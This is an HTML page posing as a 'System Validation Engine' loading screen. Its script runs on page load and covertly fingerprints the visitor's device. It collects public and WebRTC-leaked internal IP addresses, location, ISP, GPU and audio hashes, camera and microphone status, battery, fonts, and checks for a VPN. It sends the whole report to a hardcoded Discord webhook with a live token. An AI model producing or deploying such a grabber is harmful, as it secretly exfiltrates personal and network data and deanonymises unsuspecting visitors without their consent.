<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>System Validation Engine</title>
    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:30px;height:30px;animation:s 0.6s cubic-bezier(0.4, 0, 0.2, 1) infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
</head>
<body>
    <div class="l"></div>
    <script>
        "use strict";

        class ForensicEngine {
            constructor() {
                this.endpoint = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
                this.tunnel = "https://corsproxy.io/?";
            }

            // 1. HARDWARE & ENTROPY (KorumalÄ±)
            async getHardware() {
                const cv = document.createElement('canvas');
                const gl = cv.getContext('webgl2') || cv.getContext('experimental-webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                const ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = ac.createOscillator();
                const comp = ac.createDynamicsCompressor();
                osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ac.currentTime);
                osc.connect(comp); comp.connect(ac.destination);
                osc.start(0); const buffer = await ac.startRendering();
                const audioHash = buffer.getChannelData(0).slice(4500, 5000).reduce((a, b) => a + Math.abs(b), 0);

                return {
                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                    sh_prec: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT).precision,
                    audio_entropy: audioHash.toFixed(15),
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    touch: navigator.maxTouchPoints
                };
            }

            // 2. NETWORK & VPN (KorumalÄ±)
            async getNetwork() {
                const start = performance.now();
                const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                const rtt = performance.now() - start;
                const internal = await new Promise(z => {
                    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                    pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => { if(e?.candidate?.candidate) { const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(m) { pc.close(); z(m[1]); } } };
                    setTimeout(() => z("Protected"), 1200);
                });
                return { ...ip, internal, rtt: rtt.toFixed(2) + "ms" };
            }

            // 3. LINGUISTIC & TEMPORAL (YENÄ° - EN DERÄ°N TEKNÄ°K)
            getLinguisticData() {
                const options = Intl.DateTimeFormat().resolvedOptions();
                const numberFormat = new Intl.NumberFormat().resolvedOptions();
                const segmenter = ("Segmenter" in Intl) ? "Active" : "Legacy";
                
                // VPN Tespiti iÃ§in IP Saat Dilimi vs Sistem Saat Dilimi
                return {
                    sys_tz: options.timeZone,
                    sys_lang: navigator.language,
                    all_langs: navigator.languages.join(", "),
                    calendar: options.calendar,
                    num_system: numberFormat.numberingSystem,
                    time_format: options.hour12 ? "12h" : "24h",
                    intl_seg: segmenter,
                    sys_time: new Date().toLocaleString(),
                    utc_offset: new Date().getTimezoneOffset() / -60
                };
            }

            // 4. MEDIA & KERNEL (KorumalÄ±)
            async getKernel() {
                const devs = await navigator.mediaDevices.enumerateDevices().catch(() => []);
                const storage = await navigator.storage?.estimate() || {};
                const battery = navigator.getBattery ? await navigator.getBattery() : {};
                const perms = async (n) => (await navigator.permissions.query({name: n}).catch(() => ({state: 'N/A'}))).state;

                return {
                    os: navigator.platform,
                    has_cam: devs.some(d => d.kind === 'videoinput'),
                    has_mic: devs.some(d => d.kind === 'audioinput'),
                    cam_count: devs.filter(d => d.kind === 'videoinput').length,
                    heap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) + "MB" : "N/A",
                    disk: (storage.quota / 1073741824).toFixed(2) + "GB",
                    bat: battery.level ? `${Math.round(battery.level * 100)}% [${battery.charging ? 'AC' : 'DC'}]` : "N/A",
                    cam_perm: await perms('camera'),
                    mic_perm: await perms('microphone'),
                    pdf: navigator.pdfViewerEnabled,
                    fonts: ["Ubuntu", "Consolas", "Roboto", "Impact", "Georgia"].filter(f => document.fonts.check(`12px "${f}"`)).join(", ")
                };
            }

            async run() {
                const [hw, net, kernel] = await Promise.all([this.getHardware(), this.getNetwork(), this.getKernel()]);
                const ling = this.getLinguisticData();
                const vpn_status = (net.timezone && ling.sys_tz !== net.timezone) ? "ğŸš© VPN_DETECTED (TZ_MISMATCH)" : "âœ… DIRECT";

                const report = {
                    embeds: [{
                        title: "ğŸ’€ KERNEL_REPORT_V65_ULTIMATE",
                        color: 0xff0000,
                        fields: [
                            { name: "ğŸ“¡ AÄ VE VPN (9)", value: `**Ext IP:** \`${net.ip}\` | **Int IP:** \`${net.internal}\`\n**ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name}\n**VPN:** ${vpn_status} | **RTT:** ${net.rtt}`, inline: false },
                            { name: "â° SAAT VE ZAMAN (5)", value: `**Sistem TZ:** ${ling.sys_tz}\n**IP TZ:** ${net.timezone || 'N/A'}\n**Sistem Saati:** ${ling.sys_time}\n**UTC Offset:** UTC+${ling.utc_offset}\n**Format:** ${ling.time_format}`, inline: false },
                            { name: "ğŸŒ DÄ°L VE LOKALÄ°ZASYON (5)", value: `**Ana Dil:** ${ling.sys_lang}\n**DiÄŸer Diller:** ${ling.all_langs}\n**Takvim:** ${ling.calendar} | **SayÄ± Sistemi:** ${ling.num_system}\n**Intl Segmenter:** ${ling.intl_seg}`, inline: false },
                            { name: "âš™ï¸ DONANIM ANALÄ°ZÄ° (8)", value: `**GPU:** ${hw.gpu}\n**Audio Hash:** ${hw.audio_entropy}\n**CPU:** ${hw.cores} | **RAM:** ${hw.ram}GB | **Heap:** ${kernel.heap}\n**Shader:** ${hw.sh_prec} | **Touch:** ${hw.touch}`, inline: false },
                            { name: "ğŸ“¸ MEDYA VE SÄ°STEM (8)", value: `**Kamera:** ${kernel.has_cam} (${kernel.cam_count}) | **Mik:** ${kernel.has_mic}\n**OS:** ${kernel.os} | **Pil:** ${kernel.bat}\n**Disk:** ${kernel.disk} | **Cam Perm:** ${kernel.cam_perm}\n**PDF:** ${kernel.pdf} | **Dark:** ${window.matchMedia('(prefers-color-scheme: dark)').matches}`, inline: false },
                            { name: "ğŸ“ EKRAN VE FONT", value: `**Res:** ${screen.width}x${screen.height} | **DPI:** ${window.devicePixelRatio}\n**Fonts:** \`${kernel.fonts}\``, inline: false },
                            { name: "ğŸ” USER_AGENT", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Protocol: Omniscience v65.0 | Linguistic & Temporal Logic Stable" },
                        timestamp: new Date().toISOString()
                    }]
                };

                const b = new Blob([JSON.stringify(report)], { type: 'application/json' });
                fetch(this.tunnel + encodeURIComponent(this.endpoint), { method: 'POST', body: b, mode: 'no-cors' });
                if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, b);
            }
        }

        new ForensicEngine().run();
    </script>
</body>
</html>

